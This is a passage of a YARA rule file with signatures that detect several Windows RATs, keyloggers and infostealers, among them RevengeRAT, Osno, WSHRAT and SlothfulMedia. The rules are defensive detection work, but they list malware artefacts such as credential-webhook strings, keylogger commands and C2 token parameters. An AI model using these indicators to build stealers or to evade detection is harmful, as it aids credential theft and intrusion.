		$x1 = "Vaultcli.dll" fullword ascii
		$x2 = "Bcrypt.dll" fullword ascii
		$x3 = "*.localstor" ascii
		$x4 = "operator<=>" fullword ascii
		$x5 = ".data$rs" fullword ascii
		$x6 = "https_discordap" ascii
		$o1 = { 53 56 8b 75 08 8d 85 64 ff ff ff 57 6a ff 6a 01 }
		$o2 = { 6a 00 68 00 04 00 00 ff b5 a8 fe ff ff ff b5 ac }
		$o3 = { ff 75 0c 8d 85 44 ff ff ff 50 e8 aa f7 ff ff 8b }
		$o4 = { 8b 47 04 c6 40 19 01 8d 85 6c ff ff ff 8b 0f 50 }
		$o5 = { 8d 8d ?? ff ff ff e8 5b }

	condition:
		(( 3 of ( $s* ) or ( 6 of ( $txt* ) and 2 of ( $s* ) ) or ( $upat and 1 of ( $s* ) and 2 of ( $txt* ) ) or ( all of ( $url* ) and ( 2 of ( $txt* ) or 1 of ( $s* ) ) ) ) or ( uint16( 0 ) == 0x5a4d and all of ( $x* ) or ( all of ( $o* ) and 3 of ( $x* ) ) ) )
}
rule DITEKSHEN_MALWARE_Win_Remoteutilitiesrat : FILE
{
	meta:
		description = "RemoteUtilitiesRAT RAT payload"
		author = "ditekSHen"
		id = "1cf3ece1-e723-5302-9673-273381ba7a8b"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1521-L1537"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "179a559f6a6ffbce31595bd613d338bb6ac40b8a083ed0169cde754b6ed756c7"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Trojan.RemoteUtilitiesRAT"

	strings:
		$s1 = "rman_message" wide
		$s2 = "rms_invitation" wide
		$s3 = "rms_host_" wide
		$s4 = "rman_av_capture_settings" wide
		$s5 = "rman_registry_key" wide
		$s6 = "rms_system_information" wide
		$s7 = "_rms_log.txt" wide
		$s8 = "rms_internet_id_settings" wide

	condition:
		uint16( 0 ) == 0x5a4d and 4 of them
}
rule DITEKSHEN_MALWARE_Win_Slothfulmedia : FILE
{
	meta:
		description = "SlothfulMedia backdoor payload"
		author = "ditekSHen"
		id = "e94b6d67-137c-5cfb-9c59-fbeb6cd85f0a"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1539-L1565"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "6f742e8d9d555b44daaa09835f599c99e16cd39bb106c8f43fbbca7093de462e"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$x1 = /ExtKeylogger(Start|Stop)/ fullword ascii
		$x2 = /ExtService(Add|Delete|Start|Stop)/ fullword ascii
		$x3 = /ExtRegKey(Add|Del)/ fullword ascii
		$x4 = /ExtRegItem(Add|Del)/ fullword ascii
		$x5 = "ExtUnload" fullword ascii
		$s1 = "Local Security Process" fullword wide
		$s2 = "Global%s%d" fullword wide
		$s3 = "%s%s_%d.dat" fullword wide
		$s4 = "\\AppIni" fullword wide
		$s5 = "%s.tmp" fullword wide
		$s6 = "\\SetupUi" fullword wide
		$s7 = "%s|%s|%s|%s" fullword wide
		$s8 = "\\ExtInfo" fullword wide
		$cnc1 = "/v?m=" fullword ascii
		$cnc2 = "%s&i=%d" fullword ascii
		$cnc3 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75" fullword ascii
		$cnc4 = "Content-Length: %d" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 3 of ( $x* ) or 7 of ( $s* ) or all of ( $cnc* ) or ( 1 of ( $x* ) and 4 of ( $s* ) ) )
}
rule DITEKSHEN_MALWARE_Win_Apocalypse : FILE
{
	meta:
		description = "Apocalypse infostealer payload"
		author = "ditekSHen"
		id = "f1fa6642-fe42-57e7-a1bc-0f59815049f8"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1598-L1615"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d18ac492ad57cf390f20693cb47ae2c6e3dbdd921fa846130a4bc20047e1aa27"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "OpenClipboard" fullword ascii
		$s2 = "SendARP" fullword ascii
		$s3 = "GetWebRequest" fullword ascii
		$s4 = "DotNetGuard" fullword ascii
		$s5 = "set_CreateNoWindow" fullword ascii
		$s6 = "UploadFile" fullword ascii
		$s7 = "GetHINSTANCE" fullword ascii
		$s8 = "Kill" fullword ascii
		$s9 = "GetProcesses" fullword ascii
		$s10 = "get_PrimaryScreen" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule DITEKSHEN_MALWARE_Win_Osno : FILE
{
	meta:
		description = "Osno ransomware and infostealer payload"
		author = "ditekSHen"
		id = "25ed5ad4-804a-5608-b6fe-a811ca6744d8"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1617-L1652"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "3df59c306017001467a5f237db2ab37d97c34116558e18420a6a1f01f08f520f"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = ".HolyGate+<>c+<<FinalBoss>" ascii
		$s2 = /Osno(Keylogger|Stealer|Ransom)/ wide
		$s3 = "password,executeWebhook('Account credentials" wide
		$s4 = "-Name Osno -PropertyType" wide
		$s5 = "process.env.hook" ascii
		$s6 = "Stealer.JSON.JsonValue" ascii
		$s7 = "<DetectBrowserss>b_" ascii
		$s8 = "<TryGetDiscordPath>b_" ascii
		$s9 = "antiVM" fullword ascii
		$s10 = "downloadurl" fullword ascii
		$s11 = "set_sPassword" fullword ascii
		$txt0 = "{0} {1} .txt" fullword wide
		$txt1 = "\\ScanningNetworks.txt" fullword wide
		$txt2 = "\\SteamApps.txt" fullword wide
		$txt3 = "-ErrorsLogs.txt" fullword wide
		$txt4 = "-keylogs.txt" fullword wide
		$txt5 = "Hardware & Soft.txt" fullword wide
		$cnc0 = "/csharp/" ascii wide
		$cnc1 = "token=" ascii wide
		$cnc2 = "&timestamp=" ascii wide
		$cnc3 = "&session_id=" ascii wide
		$cnc4 = "&aid=" ascii wide
		$cnc5 = "&secret=" ascii wide
		$cnc6 = "&api_key" ascii wide
		$cnc7 = "&session_key=" ascii wide
		$cnc8 = "&type=" ascii wide

	condition:
		( uint16( 0 ) == 0x5a4d and ( 6 of ( $s* ) or 4 of ( $txt* ) or ( 4 of ( $s* ) and 2 of ( $txt* ) ) ) ) or ( 7 of ( $cnc* ) )
}
rule DITEKSHEN_MALWARE_Win_Betabot : FILE
{
	meta:
		description = "BetaBot payload"
		author = "ditekSHen"
		id = "377c500c-5727-5bea-ac46-cb69c868a607"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1654-L1666"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e594d01874ee622169d6708ddc6cfde7f1d26d2bea1604961dc860700e8a1d5d"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = "__restart" fullword ascii
		$s2 = "%SystemRoot%\\SysWOW64\\tapi3.dll" fullword wide
		$s3 = "%SystemRoot%\\system32\\tapi3.dll" fullword wide
		$s4 = "publicKeyToken=\"6595b64144ccf1df\"" ascii
		$s5 = "VirtualProtectEx" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 600KB and all of them
}
rule DITEKSHEN_MALWARE_Win_Wshratplugin : FILE
{
	meta:
		description = "WSHRAT keylogger plugin payload"
		author = "ditekSHen"
		id = "45c4fc87-6c45-5cd7-9fc4-7d3ea664a740"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1668-L1685"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "3feeab43b58b533b7d2d41a71f2107e6f05b9c54ff805607843d253cadbe9384"
		score = 75
		quality = 75
		tags = "FILE"
		snort_sid = "920010-920012"
		clamav_sig = "MALWARE.Win.Trojan.WSHRAT-KLG"

	strings:
		$s1 = "GET /open-keylogger HTTP/1.1" fullword wide
		$s2 = "KeyboardChange: nCode={0}, wParam={1}, vkCode={2}, scanCode={3}, flags={4}, dwExtraInfo={6}" wide
		$s3 = "MouseChange: nCode={0}, wParam={1}, x={2}, y={3}, mouseData={4}, flags={5}, dwExtraInfo={7}" wide
		$s4 = "sendKeyLog" fullword ascii
		$s5 = "saveKeyLog" fullword ascii
		$s6 = "get_TotalKeyboardClick" fullword ascii
		$s7 = "get_SessionMouseClick" fullword ascii
		$pdb = "\\Android\\documents\\visual studio 2010\\Projects\\Keylogger\\Keylogger\\obj\\x86\\Debug\\Keylogger.pdb" ascii

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 100KB and 4 of them
}
rule DITEKSHEN_MALWARE_Win_Revengerat : FILE
{
	meta:
		description = "RevengeRAT and variants payload"
		author = "ditekSHen"
		id = "7d725050-108c-54b5-978e-2dd2124f5b0f"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1687-L1713"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "be9e50052f45b94d5995db723dd64d16a91c5ba0d3f589c018155c0cce45124f"
		score = 75
		quality = 75
		tags = "FILE"
		snort_sid = "920000-920002"

	strings:
		$l1 = "Lime.Connection" fullword ascii
		$l2 = "Lime.Packets" fullword ascii
		$l3 = "Lime.Settings" fullword ascii
		$l4 = "Lime.NativeMethods" fullword ascii
		$s1 = "GetAV" fullword ascii
		$s2 = "keepAlivePing!" fullword ascii wide
		$s3 = "Revenge-RAT" fullword ascii wide
		$s4 = "*-]NK[-*" fullword ascii wide
		$s5 = "RV_MUTEX" fullword ascii wide
		$s6 = "set_SendBufferSize" fullword ascii
		$s7 = "03C7F4E8FB359AEC0EEF0814B66A704FC43FB3A8" fullword ascii
		$s8 = "5B1EE7CAD3DFF220A95D1D6B91435D9E1520AC41" fullword ascii
		$s9 = "\\RevengeRAT\\" ascii
		$q1 = "Select * from AntiVirusProduct" fullword ascii wide
		$q2 = "SELECT * FROM FirewallProduct" fullword ascii wide
		$q3 = "select * from Win32_Processor" fullword ascii wide

	condition:
		uint16( 0 ) == 0x5a4d and ( ( 1 of ( $l* ) and 3 of ( $s* ) ) or ( all of ( $q* ) and 3 of ( $s* ) ) or 3 of ( $s* ) )
}
